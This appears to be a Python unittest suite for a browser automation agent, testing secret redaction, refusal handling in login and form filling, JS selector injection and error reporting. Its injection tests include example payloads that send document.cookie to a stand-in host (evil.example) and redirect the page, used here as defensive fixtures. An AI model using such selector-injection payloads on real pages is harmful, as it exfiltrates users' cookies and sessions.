#!/usr/bin/env python3
"""
Adversarial tests for agent/browser_agent.py.

browser_agent.py is both a CLI and a library: callers import
BrowserAutomationAgent and drive a real browser with it. That makes three
things load-bearing, and none of them were covered:

  * Credentials. login() and fill_form() take plaintext secrets. The MCP
    server redacts them from its log and its audit trail
    (mcp-server/server.py:184, mcp-server/safety.py:181) and the extension
    refuses password fields unless the operator opts in
    (extension/content.js:379). The client sits in front of all of that, so
    if the client prints or retains the secret the server's redaction buys
    nothing.
  * The API token. It is the only thing between a local process and full
    control of the browser. It must reach the server and go nowhere else.
  * Honesty. Every method here returns a dict or a list that a caller (often
    an LLM) reads as the outcome. A refusal reported as a success, or a
    transport failure reported as a tool failure, makes the caller act on
    something that never happened.

Tests marked "CURRENT BEHAVIOUR" pin down what the code does today, as a
regression guard. Every other test asserts the behaviour the project's own
stated policy requires, so a failure there is a defect in the source, not in
the test.

No test touches the network: urlopen is replaced for the whole of every test
case, and the stub raises if the client makes a request the test did not
queue a response for.

Run: python3 -m unittest tests.test_browser_agent -v
"""

import io
import json
import re
import shutil
import sys
import tempfile
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from unittest import mock

from tests import TEST_HOME  # noqa: F401  (redirects HOME on import)

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / 'agent'))

import browser_agent  # noqa: E402

# Captured before any test patches it.
DEFAULT_TOKEN_FILE = browser_agent._TOKEN_FILE

PASSWORD = 'c0rrect-horse-battery-staple'
TOKEN = 'tok-deadbeefdeadbeefdeadbeef'


class LoopGuard(BaseException):
    """Breaks a client loop that would otherwise spin forever.

    Deliberately a BaseException so the production code's bare
    'except Exception' cannot swallow it.
    """


# --------------------------------------------------------------------------
# Transport stub
# --------------------------------------------------------------------------

class FakeResponse:
    """Stands in for the HTTPResponse that urlopen returns."""

    def __init__(self, body, status=200):
        if not isinstance(body, bytes):
            body = body.encode('utf-8')
        self._body = body
        self.status = status

    def read(self):
        return self._body

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


class SentRequest:
    """What the client actually put on the wire."""

    def __init__(self, req, timeout):
        self.url = req.full_url
        self.method = req.get_method()
        self.timeout = timeout
        # urllib title-cases header names, so normalise them for lookups.
        self.headers = {k.lower(): v for k, v in req.headers.items()}
        self.raw_body = req.data

    def header(self, name):
        return self.headers.get(name.lower())

    @property
    def body(self):
        if not self.raw_body:
            return None
        return json.loads(self.raw_body.decode('utf-8'))

    @property
    def arguments(self):
        return (self.body or {}).get('arguments', {})


class Transport:
    """Replays queued responses and records every request."""

    def __init__(self):
        self.queue = []
        self.requests = []

    def __call__(self, req, timeout=None):
        self.requests.append(SentRequest(req, timeout))
        if not self.queue:
            raise AssertionError(
                'the client made an unexpected request to %s (the test queued '
                'no response for it)' % req.full_url)
        nxt = self.queue.pop(0)
        if isinstance(nxt, BaseException):
            raise nxt
        return nxt


def http_error(code, reason, body=b'{"error": "Unauthorized"}'):
    return browser_agent.urllib.error.HTTPError(
        browser_agent.MCP_SERVER_URL + '/mcp/call', code, reason, {},
        io.BytesIO(body))


# --------------------------------------------------------------------------
# JS string-literal decoding, for the selector-interpolation tests
# --------------------------------------------------------------------------

_SELECTOR_LITERAL = re.compile(
    r"""querySelectorAll\(\s*(['"])((?:\\.|(?!\1)[^\\])*)\1\s*\)""", re.S)

_JS_ESCAPES = {'n': '\n', 't': '\t', 'r': '\r', 'b': '\b',
               'f': '\f', 'v': '\v', '0': '\0'}


def decode_js_string(body):
    """Decode the body of a JS string literal the way a JS engine would.

    An unrecognised escape yields the escaped character itself, which is
    exactly why pasting a raw CSS selector into JS source is a bug:
    '.md\\:flex' becomes '.md:flex'.
    """
    out, i = [], 0
    while i < len(body):
        ch = body[i]
        if ch == '\\' and i + 1 < len(body):
            nxt = body[i + 1]
            if nxt == 'u' and len(body) >= i + 6:
                out.append(chr(int(body[i + 2:i + 6], 16)))
                i += 6
                continue
            if nxt == 'x' and len(body) >= i + 4:
                out.append(chr(int(body[i + 2:i + 4], 16)))
                i += 4
                continue
            out.append(_JS_ESCAPES.get(nxt, nxt))
            i += 2
            continue
        out.append(ch)
        i += 1
    return ''.join(out)


# --------------------------------------------------------------------------
# Base case
# --------------------------------------------------------------------------

class AgentTestCase(unittest.TestCase):

    def setUp(self):
        self.transport = Transport()
        patcher = mock.patch.object(
            browser_agent.urllib.request, 'urlopen', self.transport)
        patcher.start()
        self.addCleanup(patcher.stop)

        # Each test gets its own token file, so the real installation and the
        # shared test HOME are both left alone. Absent unless a test writes it.
        token_dir = tempfile.mkdtemp(prefix='ccb-agent-test-')
        self.addCleanup(shutil.rmtree, token_dir, True)
        self.token_file = Path(token_dir) / 'api_token'
        token_patcher = mock.patch.object(
            browser_agent, '_TOKEN_FILE', self.token_file)
        token_patcher.start()
        self.addCleanup(token_patcher.stop)

    # -- stub helpers ------------------------------------------------------

    def serve(self, *responses):
        """Queue raw responses: a FakeResponse, or an exception to raise."""
        self.transport.queue.extend(responses)

    def serve_json(self, *payloads):
        for payload in payloads:
            self.transport.queue.append(FakeResponse(json.dumps(payload)))

    def serve_ok(self, count=1, **payload):
        for _ in range(count):
            self.serve_json({'success': True, **payload})

    def serve_denial(self, count=1, decision='confirmation_required'):
        """What mcp-server/safety.py hands back for a guarded action."""
        for _ in range(count):
            self.serve_json({
                'success': False,
                'safety_decision': decision,
                'error': 'browser_type on a protected site requires '
                         'confirmation. Repeat the exact same call with '
                         'confirm_token.',
                'confirm_token': 'abc123',
            })

    def serve_element_not_found(self, **options):
        """What the extension throws when no element matched.

        extension/content.js:802 builds the message as
        `Element not found with options: ${JSON.stringify(options)}`, so the
        text it was asked to type comes back inside a free-text error string,
        where no key name marks it as a secret.
        """
        self.serve_json({
            'success': False,
            'error': 'Element not found with options: %s' % json.dumps(options),
        })

    def serve_password_refusal(self, count=1):
        """What the extension returns by default for a password field."""
        for _ in range(count):
            self.serve_json({
                'success': False,
                'error': 'Refused: target is a password field. Use the '
                         'browser’s own password manager (autofill) for '
                         'credentials, or set "allow_password_typing": true '
                         'in ~/.claudecodebrowser/safety.json if you really '
                         'want automated password entry.',
            })

    # -- assertion helpers -------------------------------------------------

    @property
    def requests(self):
        return self.transport.requests

    def only_request(self):
        self.assertEqual(len(self.requests), 1,
                         'expected exactly one HTTP request, got %d'
                         % len(self.requests))
        return self.requests[0]

    def history_dump(self, agent):
        """Everything the agent kept about what it did."""
        return repr([(a.action_type, a.parameters, a.result, a.error)
                     for a in agent.action_history])

    def capture(self, fn, *args, **kwargs):
        buf = io.StringIO()
        with redirect_stdout(buf):
            result = fn(*args, **kwargs)
        return result, buf.getvalue()

    def outcome(self, fn, *args, **kwargs):
        """Call fn and report either value or exception.

        Several methods could reasonably signal a refusal by raising or by
        returning something falsifiable; these tests accept either, so they
        pin the requirement without dictating the fix.
        """
        try:
            return 'returned', fn(*args, **kwargs)
        except Exception as exc:  # noqa: BLE001 - raising is an acceptable fix
            return 'raised', exc

    def assert_selector_is_data_not_code(self, script, selector):
        match = _SELECTOR_LITERAL.search(script)
        self.assertIsNotNone(
            match,
            'the selector was interpolated so that querySelectorAll() no '
            'longer holds one well-formed string literal: the rest of the '
            'selector is now executable JavaScript. Script:\n%s' % script)
        decoded = decode_js_string(match.group(2))
        self.assertEqual(
            decoded, selector,
            'the selector must reach querySelectorAll() unchanged, as data. '
            'It arrived as %r instead of %r. Encode it (json.dumps, or any '
            'escaping that round-trips) instead of pasting it into the '
            'source. Script:\n%s' % (decoded, selector, script))


# --------------------------------------------------------------------------
# 1. API token
# --------------------------------------------------------------------------

class ApiTokenTests(AgentTestCase):
    """The token authorises full control of the browser. It has to reach the
    server, and it must not reach anything else."""

    def test_the_token_is_read_from_the_user_configuration_directory(self):
        # CURRENT BEHAVIOUR (regression guard): never from the repo or /tmp.
        self.assertEqual(
            DEFAULT_TOKEN_FILE,
            Path(TEST_HOME) / '.claudecodebrowser' / 'api_token')

    def test_the_token_is_sent_when_the_file_exists(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.token_file.write_text(TOKEN)
        self.serve_ok()
        browser_agent.BrowserAutomationAgent().navigate('https://example.com')
        self.assertEqual(self.only_request().header('X-API-Key'), TOKEN)

    def test_surrounding_whitespace_is_stripped_from_the_token(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.token_file.write_text('  %s\n' % TOKEN)
        self.serve_ok()
        browser_agent.BrowserAutomationAgent().navigate('https://example.com')
        self.assertEqual(self.only_request().header('X-API-Key'), TOKEN)

    def test_a_missing_token_file_sends_no_token_header(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_ok()
        browser_agent.BrowserAutomationAgent().navigate('https://example.com')
        req = self.only_request()
        self.assertIsNone(req.header('X-API-Key'))
        self.assertEqual(req.header('Content-Type'), 'application/json')

    def test_an_unreadable_token_file_does_not_crash_the_client(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.token_file.write_text(TOKEN)
        self.token_file.chmod(0o000)
        self.addCleanup(self.token_file.chmod, 0o600)
        self.serve_ok()
        result = browser_agent.BrowserAutomationAgent().navigate('https://e.test')
        self.assertTrue(result.get('success'))
        self.assertIsNone(self.only_request().header('X-API-Key'))

    # Regression test for defect D14.
    def test_an_empty_token_file_sends_no_token_header(self):
        """An empty or whitespace-only token file means "not configured".
        Sending X-API-Key: '' instead turns that into a bare 403, so the user
        is told they are unauthorised rather than that their token file is
        empty."""
        self.token_file.write_text('   \n')
        self.serve_ok()
        browser_agent.BrowserAutomationAgent().navigate('https://example.com')
        self.assertIsNone(
            self.only_request().header('X-API-Key'),
            'an empty token file must not be sent as an empty credential')

    # Regression test for defect D6.
    def test_the_token_is_not_sent_to_a_non_loopback_server(self):
        """CLAUDE_BROWSERX_URL chooses the server. The token is a local secret
        for a loopback service, so it must not be attached to a request that
        leaves the machine: one stray environment variable otherwise
        exfiltrates full control of the user's browser."""
        self.token_file.write_text(TOKEN)
        self.serve_ok()
        with mock.patch.object(browser_agent, 'MCP_SERVER_URL',
                               'http://collector.example.net:8765'):
            browser_agent.BrowserAutomationAgent().navigate('https://e.test')
        req = self.only_request()
        self.assertIsNone(
            req.header('X-API-Key'),
            'the API token was sent to %s' % req.url)

    def test_the_token_never_reaches_stdout_in_verbose_mode(self):
        # CURRENT BEHAVIOUR (regression guard): headers are not logged.
        self.token_file.write_text(TOKEN)
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent(verbose=True)
        _, out = self.capture(agent.navigate, 'https://example.com')
        self.assertNotIn(TOKEN, out)

    def test_the_token_is_not_retained_in_the_action_history(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.token_file.write_text(TOKEN)
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent()
        agent.navigate('https://example.com')
        self.assertNotIn(TOKEN, self.history_dump(agent))

    def test_a_403_error_message_does_not_quote_the_token(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.token_file.write_text(TOKEN)
        self.serve(http_error(403, 'Forbidden'))
        agent = browser_agent.BrowserAutomationAgent(verbose=True)
        result, out = self.capture(agent.navigate, 'https://example.com')
        self.assertNotIn(TOKEN, json.dumps(result))
        self.assertNotIn(TOKEN, out)


# --------------------------------------------------------------------------
# 2. Credential handling
# --------------------------------------------------------------------------

class CredentialHandlingTests(AgentTestCase):

    # Regression test for defect D1: call_tool logged the raw kwargs, so
    # --verbose printed the password to the terminal and into any captured
    # session log, undoing the redaction the server and the audit log perform.
    def test_a_password_is_not_printed_in_verbose_mode(self):
        self.serve_password_refusal()
        agent = browser_agent.BrowserAutomationAgent(verbose=True)
        _, out = self.capture(agent.type_text, PASSWORD,
                              selector='input[type="password"]')
        self.assertNotIn(
            PASSWORD, out,
            'the password reached stdout; redact the argument names '
            'server.py already treats as sensitive before logging them')

    # Regression test for defect D2: call_tool kept the raw kwargs in
    # action_history, so the plaintext password stayed in the process for the
    # life of the agent, reachable from any dump, traceback or crash report.
    def test_a_password_is_not_retained_in_the_action_history(self):
        self.serve_password_refusal()
        agent = browser_agent.BrowserAutomationAgent()
        agent.login('alice', PASSWORD, submit_selector='#go')
        self.assertNotIn(
            PASSWORD, self.history_dump(agent),
            'the password is still retained in action_history')

    # Regression test for defect D3.
    def test_verbose_mode_does_not_echo_a_credential_back_from_a_result(self):
        """Verbose mode printed the whole server result. browser_get_value
        returns a field's contents, so a result is a second path out for the
        same secret even when the client never logged its own arguments."""
        self.serve_json({'success': True, 'value': PASSWORD})
        agent = browser_agent.BrowserAutomationAgent(verbose=True)
        _, out = self.capture(agent.get_value, '#password')
        self.assertNotIn(PASSWORD, out)

    # Regression test for defect D3.
    def test_a_password_inside_an_error_message_is_not_printed_or_kept(self):
        """The other half of D3, and the one the fix for it missed: redaction
        walked the result's keys, and the extension's not-found error carries
        the typed text inside the free-text 'error' string, under no key that
        names it a secret. Both the verbose log and action_history took that
        string verbatim."""
        self.serve_element_not_found(text=PASSWORD, clear=True, name='password')
        agent = browser_agent.BrowserAutomationAgent(verbose=True)
        _, out = self.capture(agent.type_text, PASSWORD, name='password')
        self.assertNotIn(
            PASSWORD, out,
            'the password reached stdout through the error message')
        self.assertNotIn(
            PASSWORD, self.history_dump(agent),
            'the password is retained in action_history through the error '
            'message')

    def test_every_sensitive_argument_is_scrubbed_from_an_error(self):
        """The error-string scrub is driven by what was sent, so it has to
        look at every sensitive argument, not only `text`: set_value sends
        `value`, execute_script sends `script`, and a caller can send
        `password` through call_tool. Each comes back inside the extension's
        not-found error under no key that marks it."""
        for key, call in (
            ('value', lambda a: a.set_value('#card', PASSWORD)),
            ('script', lambda a: a.execute_script(PASSWORD)),
            ('password', lambda a: a.call_tool('browser_type',
                                               password=PASSWORD)),
        ):
            with self.subTest(argument=key):
                self.serve_element_not_found(**{key: PASSWORD})
                agent = browser_agent.BrowserAutomationAgent(verbose=True)
                _, out = self.capture(call, agent)
                self.assertNotIn(PASSWORD, out)
                self.assertNotIn(PASSWORD, self.history_dump(agent))

    def test_a_three_character_secret_is_scrubbed_from_an_error(self):
        """A card CVC or a short PIN is three characters. The floor exists so
        a one- or two-character value does not blank ordinary prose; it must
        not also let the shortest real secrets through."""
        self.serve_element_not_found(text='123', selector='#cvc')
        agent = browser_agent.BrowserAutomationAgent(verbose=True)
        _, out = self.capture(agent.type_text, '123', selector='#cvc')
        self.assertNotIn('123', out)
        self.assertNotIn('123', self.history_dump(agent))

    # Regression test for defect D3.
    def test_an_abandoned_login_does_not_quote_the_password_back(self):
        """login() explains why it stopped, and the reason it quotes is the
        server's error - which, for a not-found error, is the typed password.
        The explanation must not put the secret back in the caller's hands."""
        self.serve_ok()  # username typed
        self.serve_element_not_found(text=PASSWORD, clear=True,
                                     selector='#p')  # no password field there
        agent = browser_agent.BrowserAutomationAgent()
        results = agent.login('alice', PASSWORD,
                              username_selector='#u', password_selector='#p')
        self.assertNotIn(PASSWORD, json.dumps(results))

    # Regression test for defect D5.
    def test_login_does_not_submit_the_form_after_the_password_is_refused(self):
        """Under the shipped default (allow_password_typing: false) the
        password step always fails. Pressing Enter anyway submits the form
        with a username and an empty password: a real failed login attempt
        against the real site, repeatable until the account locks."""
        self.serve_ok()                  # username typed
        self.serve_password_refusal()    # password refused by the extension
        self.serve_ok()                  # the submit that must not happen
        agent = browser_agent.BrowserAutomationAgent()
        agent.login('alice', PASSWORD)
        tools = [r.body['name'] for r in self.requests]
        self.assertEqual(
            len(self.requests), 2,
            'login() submitted the form after the password step was refused: '
            '%s' % tools)

    # Regression test for defect D5.
    def test_login_does_not_look_successful_when_the_password_was_refused(self):
        self.serve_ok()
        self.serve_password_refusal()
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent()
        results = agent.login('alice', PASSWORD, submit_selector='#go')
        self.assertFalse(
            results[-1].get('success'),
            'the last entry login() returns is what a caller reads as the '
            'outcome, and it reports success although the credential never '
            'reached the field: %r' % (results,))

    # Regression test for defect D5: the first fix for it guarded only the
    # password step, so the same bug survived with the fields swapped.
    def test_login_stops_before_the_password_when_the_username_is_refused(self):
        """A refused username left the password to be typed anyway and Enter
        pressed on it: the form was submitted with an empty username and a
        real password, and the secret was sent to the browser after the
        sequence had already been refused once."""
        self.serve_password_refusal()  # the username field was refused
        self.serve_ok()                # the password typing that must not run
        self.serve_ok()                # the submit that must not happen
        agent = browser_agent.BrowserAutomationAgent()
        agent.login('alice', PASSWORD)
        self.assertEqual(
            len(self.requests), 1,
            'login() carried on after the username step was refused: %s'
            % [r.body['name'] for r in self.requests])
        self.assertNotIn(
            PASSWORD, json.dumps([r.arguments for r in self.requests]),
            'the password was sent to the browser after the username step '
            'had already been refused')

    # Regression test for defect D5.
    def test_login_does_not_look_successful_when_the_username_was_refused(self):
        self.serve_password_refusal()
        self.serve_ok()
        self.serve_ok()
        agent = browser_agent.BrowserAutomationAgent()
        results = agent.login('alice', PASSWORD, submit_selector='#go')
        self.assertFalse(
            results[-1].get('success'),
            'the last entry login() returns is what a caller reads as the '
            'outcome, and it reports success although the sequence was '
            'abandoned: %r' % (results,))
        self.assertIn('NOT submitted', results[-1].get('error', ''))

    # Regression test for defect D4.
    def test_fill_form_does_not_resend_a_credential_after_a_refusal(self):
        """fill_form's retry exists for a wrong locator. A password-field
        refusal is not a wrong locator, so the retry simply posts the secret
        to the server a second time."""
        self.serve_password_refusal(2)
        agent = browser_agent.BrowserAutomationAgent()
        agent.fill_form({'password': PASSWORD})
        sent = [r for r in self.requests if PASSWORD in json.dumps(r.arguments)]
        self.assertLessEqual(
            len(sent), 1,
            'the password was transmitted %d times' % len(sent))

    # The same defect as D5, in the other multi-step helper.
    def test_fill_form_does_not_submit_after_a_field_was_refused(self):
        """fill_form checked each field's result only to decide whether to
        retry the locator, then submitted regardless. With the password field
        refused that submits a login form holding an empty password - a real
        failed attempt against the real site - and the click's own success
        made the returned list read as a completed fill."""
        self.serve_password_refusal()  # the password field was refused
        self.serve_ok()                # the submit that must not happen
        agent = browser_agent.BrowserAutomationAgent()
        results = agent.fill_form({'password': PASSWORD}, submit=True,
                                  submit_selector='#go')
        self.assertEqual(
            [r.body['name'] for r in self.requests], ['browser_type'],
            'fill_form submitted the form although a field was refused')
        self.assertFalse(results[-1].get('success'))
        self.assertIn('NOT submitted', results[-1].get('error', ''))


class RedactionListParityTests(unittest.TestCase):
    """This client cannot import from mcp-server/, so its redaction list is a
    deliberate mirror of the guard's. It was the copy left behind: `key` and
    `url` were added to safety.py's list and never here, so browser_press_key
    printed the key and browser_navigate printed a URL with its token."""

    def _safety_module(self):
        import importlib.util
        root = Path(__file__).resolve().parent.parent
        spec = importlib.util.spec_from_file_location(
            'ccb_safety_for_parity', root / 'mcp-server' / 'safety.py')
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        return module

    def test_the_mirror_covers_everything_the_guard_redacts(self):
        guard_args = set(self._safety_module().SENSITIVE_ARGS)
        missing = guard_args - browser_agent._SENSITIVE_ARGS \
            - browser_agent._URL_ARGS
        self.assertEqual(missing, set(),
                         'safety.py redacts these and this client does not: '
                         f'{sorted(missing)}')

    def test_a_url_argument_is_reduced_not_printed(self):
        for raw, secret in (
            ('https://alice:hunter2@intranet.test/', 'hunter2'),
            ('https://example.test/reset?token=S3CRET', 'S3CRET'),
            ('https://sso.test/cb#id_token=eyJhbGci', 'eyJhbGci'),
        ):
            with self.subTest(url=raw):
                out = browser_agent._redact({'url': raw})
                self.assertNotIn(secret, str(out), out)
                self.assertIn('test', str(out['url']),
                              'the host is what a log is read for')

    def test_a_url_of_an_unusual_shape_is_still_reduced(self):
        """The three branches of _reduce_url that the plain https cases above
        never reach, each with its own way of leaking."""
        for raw, secrets, kept in (
            # Not a location but a payload: the whole of it is the secret.
            ('javascript:fetch("//evil.test/?c="+S3CRET)', ['S3CRET'],
             'javascript'),
            ('data:text/html,<p>S3CRET</p>', ['S3CRET'], 'data'),
            # An unescaped '@' in the password: only the LAST '@' ends the
            # userinfo, so splitting at the first one keeps half of it.
            ('https://usr:PW1@PW2@h.test/', ['usr', 'PW1', 'PW2'], 'h.test'),
            # urlsplit raises on an unclosed IPv6 bracket. The raw value is
            # unparsed, not safe: it still holds the query.
            ('http://[bad/?token=S3CRET', ['S3CRET'], None),
        ):
            for name, out in (
                ('argument', browser_agent._redact({'url': raw})),
                ('result', browser_agent._redact_result({'url': raw}, ())),
            ):
                with self.subTest(url=raw, via=name):
                    for secret in secrets:
                        self.assertNotIn(secret, str(out), out)
                    if kept:
                        self.assertIn(kept, out['url'])

    def test_a_pressed_key_is_not_printed(self):
        self.assertEqual(browser_agent._redact({'key': 'h'})['key'], '***')

    def test_a_credential_under_a_nested_key_is_masked(self):
        """The key pass ran only at the top level and inside `element`, so a
        value the PAGE held - browser_get_elements returns a list of them -
        was caught only if this client had sent it."""
        result = {'success': True, 'elements': [
            {'tag': 'input', 'name': 'pw', 'value': 'PAGE-HELD-SECRET'},
            {'tag': 'input', 'name': 'email', 'value': 'ada@example.test'},
        ]}
        safe = browser_agent._redact_result(result, ())
        self.assertNotIn('PAGE-HELD-SECRET', json.dumps(safe), safe)


class PathParamTests(AgentTestCase):
    """Mirrors redact_url: a path parameter can carry a session id."""

    def test_path_parameter_values_are_masked(self):
        logged = json.dumps(browser_agent._redact(
            {'url': 'https://a.test/app;jsessionid=SESS-AGENT-1/page'}))
        self.assertNotIn('SESS-AGENT-1', logged)
        self.assertIn('/app;jsessionid=***/page', logged)


class NestedArgumentTests(AgentTestCase):
    """_redact looked at top-level keys only, so a credential nested in an
    argument went to verbose output and the action history whole."""

    def test_nested_arguments_are_redacted(self):
        args = {'options': {'password': 'NESTED-PW',
                            'inner': [{'url': 'https://x.test/r?token=NESTED-TOK'}]}}
        logged = json.dumps(browser_agent._redact(args))
        for secret in ('NESTED-PW', 'NESTED-TOK'):
            self.assertNotIn(secret, logged)
        self.assertIn('x.test/r', logged)


class ResultUrlTests(AgentTestCase):
    """A URL comes back in results as well as going out in arguments:
    browser_navigate, browser_get_text and browser_get_page_info all report
    the page's url, and browser_get_tabs lists one per tab. That is the page
    the browser LANDED on, so it carries whatever the redirect put there - a
    reset token, an OAuth ?code=, an implicit-flow #id_token=. The client did
    not send it, so the sent-value scrub cannot catch it; only reducing the
    url key does."""

    RAW = 'https://x.test/cb?code=S3CRET#id_token=EYJ'

    def assert_reduced(self, text):
        for secret in ('S3CRET', 'EYJ'):
            self.assertNotIn(secret, text)
        self.assertIn('x.test/cb', text,
                      'the host and path are what a log is read for')

    def test_a_url_in_a_result_is_reduced(self):
        safe = browser_agent._redact_result({'url': self.RAW}, ())
        self.assert_reduced(json.dumps(safe))

    def test_other_url_shaped_result_keys_are_reduced(self):
        """get_elements lists each link's href, and a protected-site denial
        names the page as protectedUrl. A link can carry a token as easily
        as the page url can."""
        result = {'elements': [{'tag': 'a', 'href': self.RAW}],
                  'protectedUrl': self.RAW}
        self.assert_reduced(
            json.dumps(browser_agent._redact_result(result, ())))

    def test_a_url_key_holding_something_else_is_not_kept_raw(self):
        """_reduce_url passed non-strings through untouched, so a url key
        holding a dict or a list was neither reduced nor scrubbed."""
        for value in ({'href': self.RAW}, [self.RAW]):
            with self.subTest(shape=type(value).__name__):
                safe = browser_agent._redact_result({'url': value}, ())
                for secret in ('S3CRET', 'EYJ'):
                    self.assertNotIn(secret, json.dumps(safe))

    def test_a_url_nested_in_a_result_is_reduced(self):
        # One tab under a key, and a list of tabs: the two shapes the
        # extension uses, and the two branches of _scrub's recursion.
        for result in ({'tab': {'id': 1, 'url': self.RAW}},
                       {'tabs': [{'id': 1, 'url': self.RAW},
                                 {'id': 2, 'url': self.RAW}]}):
            with self.subTest(result=result):
                safe = browser_agent._redact_result(result, ())
                self.assert_reduced(json.dumps(safe))

    def test_a_landed_url_is_not_printed_or_kept(self):
        self.serve_ok(url=self.RAW, title='Signed in')
        agent = browser_agent.BrowserAutomationAgent(verbose=True)
        _, out = self.capture(agent.get_page_info)
        self.assert_reduced(out)
        self.assert_reduced(self.history_dump(agent))

    def test_the_requested_url_navigate_echoes_back_is_reduced(self):
        """browser_navigate answers {url: <landed>, requestedUrl: <sent>}
        (extension/background.js). The argument log reduced the url it sent,
        and the result then printed the same url whole one line later, under
        a key the url pass did not know."""
        self.serve_ok(url='https://x.test/cb', requestedUrl=self.RAW)
        agent = browser_agent.BrowserAutomationAgent(verbose=True)
        _, out = self.capture(agent.navigate, self.RAW)
        self.assert_reduced(out)
        self.assert_reduced(self.history_dump(agent))


# --------------------------------------------------------------------------
# 3. Selector interpolation into JavaScript
# --------------------------------------------------------------------------

class SelectorInterpolationTests(AgentTestCase):
    """extract_text and extract_links paste the caller's selector straight
    into JS source inside single quotes. A selector is data: it comes from
    page content, from config or from an LLM, and the browser executes
    whatever it turns into."""

    def _script_for(self, method, selector):
        self.serve_json({'success': True, 'result': ''})
        method(selector)
        return self.only_request().arguments['script']

    # Regression test for defect D7.
    def test_extract_text_selector_cannot_break_out_of_the_literal(self):
        agent = browser_agent.BrowserAutomationAgent()
        selector = "a'); fetch('https://evil.example/?c='+document.cookie); ('"
        script = self._script_for(agent.extract_text, selector)
        self.assert_selector_is_data_not_code(script, selector)

    # Regression test for defect D7.
    def test_extract_links_selector_cannot_break_out_of_the_literal(self):
        agent = browser_agent.BrowserAutomationAgent()
        selector = "a'); document.location='https://evil.example'; ('"
        script = self._script_for(agent.extract_links, selector)
        self.assert_selector_is_data_not_code(script, selector)

    # Regression test for defect D7.
    def test_an_escaped_css_selector_survives_interpolation(self):
        """Not only a security bug: '.md\\:flex' is an everyday Tailwind
        selector. JS eats the backslash, the browser is asked for '.md:flex',
        and the caller is told, plausibly, that nothing matched."""
        agent = browser_agent.BrowserAutomationAgent()
        selector = r'.md\:flex'
        script = self._script_for(agent.extract_text, selector)
        self.assert_selector_is_data_not_code(script, selector)

    # Regression test for defect D7.
    def test_a_quoted_attribute_selector_survives_interpolation(self):
        agent = browser_agent.BrowserAutomationAgent()
        selector = "[data-label='it\\'s here']"
        script = self._script_for(agent.extract_text, selector)
        self.assert_selector_is_data_not_code(script, selector)


# --------------------------------------------------------------------------
# 4. Transport failures versus tool failures
# --------------------------------------------------------------------------

class ErrorReportingTests(AgentTestCase):
    """Every failure mode collapses into {'success': False, 'error': str}. A
    caller cannot tell "the server is down" from "the element is missing"
    from "your token is wrong", and those need opposite responses."""

    def _navigate(self, *responses):
        self.serve(*responses)
        return browser_agent.BrowserAutomationAgent().navigate('https://e.test')

    def test_a_refused_connection_is_reported_as_a_connection_failure(self):
        # CURRENT BEHAVIOUR (regression guard): this one is right.
        result = self._navigate(
            browser_agent.urllib.error.URLError(ConnectionRefusedError(61)))
        self.assertFalse(result.get('success'))
        self.assertIn('Connection failed', result['error'])

    def test_a_tool_failure_is_passed_through_unchanged(self):
        # CURRENT BEHAVIOUR (regression guard).
        result = self._navigate(
            FakeResponse('{"success": false, "error": "Element not found"}'))
        self.assertEqual(result,
                         {'success': False, 'error': 'Element not found'})

    # Regression test for defect D12.
    def test_a_403_is_reported_as_an_authentication_failure(self):
        """HTTPError subclasses URLError, so a rejected token comes back as
        "Connection failed: HTTP Error 403: Forbidden". The user restarts a
        server that was never down, and the server's own
        {"error": "Unauthorized"} body is discarded."""
        result = self._navigate(http_error(403, 'Forbidden'))
        self.assertFalse(result.get('success'))
        self.assertIn('403', result['error'])
        self.assertNotIn(
            'Connection failed', result['error'],
            'a server that answered and rejected the token is not a '
            'connection failure: %r' % result['error'])

    # Regression test for defect D12.
    def test_an_http_500_is_not_reported_as_a_connection_failure(self):
        result = self._navigate(http_error(500, 'Internal Server Error'))
        self.assertFalse(result.get('success'))
        self.assertIn('500', result['error'])
        self.assertNotIn('Connection failed', result['error'])

    # Regression test for defect D12.
    def test_a_non_json_body_is_reported_as_an_invalid_response(self):
        """A proxy or captive portal answering 200 with HTML yields
        "Expecting value: line 1 column 1 (char 0)", which tells the user
        nothing about where the problem is."""
        result = self._navigate(FakeResponse('<html>Proxy error</html>'))
        self.assertFalse(result.get('success'))
        self.assertTrue(
            any(word in result['error'].lower()
                for word in ('json', 'response', 'invalid')),
            'a bare parser message was handed to the caller: %r'
            % result['error'])

    def test_a_timeout_does_not_raise_at_the_caller(self):
        # CURRENT BEHAVIOUR (regression guard): the message is opaque ("timed
        # out"), but the library must not throw.
        result = self._navigate(TimeoutError('timed out'))
        self.assertFalse(result.get('success'))

    # Regression test for defect D12.
    def test_a_transport_failure_is_distinguishable_from_a_tool_failure(self):
        """The decision a caller must make differs completely: retry the
        request, or stop and tell the user the element is not there. Both
        arrive as {'success': False, 'error': ...} and nothing else."""
        self.serve(browser_agent.urllib.error.URLError('nope'))
        transport = browser_agent.BrowserAutomationAgent().navigate('https://e.test')
        self.serve_json({'success': False, 'error': 'Element not found'})
        tool = browser_agent.BrowserAutomationAgent().navigate('https://e.test')
        self.assertNotEqual(
            set(transport) - {'error'}, set(tool) - {'error'},
            'a transport failure and a tool failure have the same shape, so '
            'no caller can tell them apart: %r vs %r' % (transport, tool))

    def test_check_server_is_false_when_the_server_is_unreachable(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve(
            browser_agent.urllib.error.URLError(ConnectionRefusedError(61)))
        self.assertFalse(browser_agent.BrowserAutomationAgent().check_server())

    def test_check_server_is_false_when_health_does_not_report_ok(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_json({'status': 'degraded'})
        self.assertFalse(browser_agent.BrowserAutomationAgent().check_server())

    def test_check_server_uses_get_on_the_health_endpoint(self):
        # CURRENT BEHAVIOUR (regression guard).
        self.serve_json({'status': 'ok'})
        self.assertTrue(browser_agent.BrowserAutomationAgent().check_server())
        req = self.only_request()
        self.assertEqual(req.method, 'GET')
        self.assertTrue(req.url.endswith('/health'))


